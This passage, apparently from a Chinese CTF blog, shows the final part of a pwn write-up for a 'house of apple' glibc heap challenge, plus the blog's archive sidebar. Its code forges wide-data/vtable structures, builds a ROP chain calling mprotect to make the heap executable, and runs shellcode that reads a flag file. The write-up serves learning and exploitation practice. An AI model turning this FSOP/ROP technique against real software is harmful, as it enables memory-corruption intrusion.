+<h2 id="5-wdata，wvtable和shellcode"><a href="#5-wdata，wvtable和shellcode" class="headerlink" title="5. wdata，wvtable和shellcode"></a>5. wdata，wvtable和shellcode</h2><p>wdata和wvtable选择了一个复用结构（只用0x68和0xe0, 0xe0作为vtable指向自己的开头正好错位访问0x68）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">wdata = fit( <span class="comment"># overlap 等于wide_vtable和wide_data在一起</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x68</span>: gadget,  <span class="comment"># _wide_vtable -&gt; wdoallocate的位置</span></span><br><span class="line">        <span class="comment">#0xA0: heap_base + 0x37C0 + 0x10, # 自己开头，0x0</span></span><br><span class="line">        <span class="number">0xE0</span>: heap_base + <span class="number">0x37C0</span> + <span class="number">0x10</span>, <span class="comment"># _wide_data-&gt;_wide_vtable </span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]wdata: <span class="subst">&#123;wdata&#125;</span>&quot;</span>)</span><br><span class="line">Edit(<span class="number">17</span>, wdata)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_addr = heap_base + 0x2F90</span></span><br><span class="line"><span class="comment"># print(f&quot;[+]flag_addr: &#123;hex(flag_addr)&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部shellcode写入</span></span><br><span class="line">buffer = heap_base + <span class="number">0x2800</span> + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]read_flag_into_buffer: <span class="subst">&#123;<span class="built_in">hex</span>(buffer)&#125;</span>&quot;</span>)</span><br><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        ret,</span><br><span class="line">        pop_rdi_ret,</span><br><span class="line">        heap_base,</span><br><span class="line">        pop_rsi_ret,</span><br><span class="line">        <span class="number">0x7000</span>,</span><br><span class="line">        pop_rdx_r12_ret,</span><br><span class="line">        <span class="number">0x7</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        fp_mprotect,</span><br><span class="line">    ]</span><br><span class="line">) <span class="comment"># mprotect(heap_base, 0x7000, 0x7) 令堆可执行</span></span><br><span class="line">payload+=p64(<span class="number">0x2998</span> + <span class="number">8</span> + heap_base) <span class="comment"># rop最后返回到SHELLCODE写入的地方继续执行</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">Edit(<span class="number">16</span>, payload) <span class="comment"># edit</span></span><br><span class="line"><span class="comment">#最终目的是执行sc</span></span><br><span class="line">logi(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line">logi(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&quot;b _IO_wfile_overflow&quot;</span>)</span><br><span class="line">Menu(<span class="number">5</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题只是house of appe的一条链，还有其他的利用手段（v3，v2其他两条调用链）。这道题看wp感觉要疯了，真正打通之后又觉得也就那样。。难点还是见得少，现在开始感觉要多刷题了。</p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2024/09/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E6%8E%A2/" title="虚拟机初探">
+                    <div class="nextTitle">虚拟机初探</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/08/05/sandbox/" title="Sandbox  简单介绍">
+                    <div class="prevTitle">Sandbox  简单介绍</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AE%B9"><span class="toc-number">1.</span> <span class="toc-text">内容</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple-%E4%B8%80%E4%B8%AA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E4%BC%BC%E4%B9%8E%E6%98%AF%E9%80%9A%E7%94%A8%E7%9A%84ROP%E9%93%BE%E6%B2%99%E7%AE%B1orw-wp%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">house of apple 一个看起来似乎是通用的ROP链沙箱orw wp复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-large-bin-attack"><span class="toc-number">3.2.</span> <span class="toc-text">1. large bin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%AA%E9%80%A0-IO-list-all"><span class="toc-number">3.3.</span> <span class="toc-text">2. 伪造_IO_list_all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%BC%80%E5%90%AF%E6%B2%99%E7%9B%92%E7%9A%84orw%E4%B8%8EROP%E9%93%BE"><span class="toc-number">3.4.</span> <span class="toc-text">3. 开启沙盒的orw与ROP链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%A0%86%E5%9D%97%E5%B8%83%E5%B1%80"><span class="toc-number">3.5.</span> <span class="toc-text">4. 堆块布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-wdata%EF%BC%8Cwvtable%E5%92%8Cshellcode"><span class="toc-number">3.6.</span> <span class="toc-text">5. wdata，wvtable和shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 33
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/GO-rust%E7%AD%89%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91/">GO,rust等其他语言的逆向</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E6%8E%A2/">虚拟机初探</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span>
+            <a class="archive-post-title" href="/2024/08/30/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024-EzHeap/">How2Heap实战(2)——CISCN2024EzHeap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span>
+            <a class="archive-post-title" href="/2024/08/05/sandbox/">Sandbox  简单介绍</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2024/07/31/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84Kernel-Pwn/">从0开始的Kernel Pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2024/07/28/How2Heap-8%E2%80%94%E2%80%94Tcache/">How2Heap(8)——Tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span>
+            <a class="archive-post-title" href="/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">How2Heap(7)——Large Bin Attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span>
+            <a class="archive-post-title" href="/2024/07/22/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/">How2Heap总集篇导演剪辑剧场版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2024/07/18/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024/">How2Heap实战(1)——CISCN2024orange_cat_diary</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span>
+            <a class="archive-post-title" href="/2024/07/11/CSAPP-Labs%E2%80%94%E2%80%94Malloc-Lab/">CSAPP Labs——Malloc Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/">CSAPP Labs——Attack Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span>
+            <a class="archive-post-title" href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/">CSAPP Labs——Bomb Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2024/06/05/CSAPP-Labs%E2%80%94%E2%80%94Data-Lab/">CSAPP Labs——Data Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span>
+            <a class="archive-post-title" href="/2024/05/13/%E7%94%B5%E8%84%91%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86/">电脑问题解决方案整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE——File Stream Oriented Programming (1)</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span>
+            <a class="archive-post-title" href="/2023/12/14/Rust%EF%BC%9FRust%EF%BC%81-1/">Rust？Rust！(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="CSAPP">
+                <span class="iconfont-archer">&#xe606;</span>
+                CSAPP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="vm">
+                <span class="iconfont-archer">&#xe606;</span>
+                vm
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="CSAPP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CSAPP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
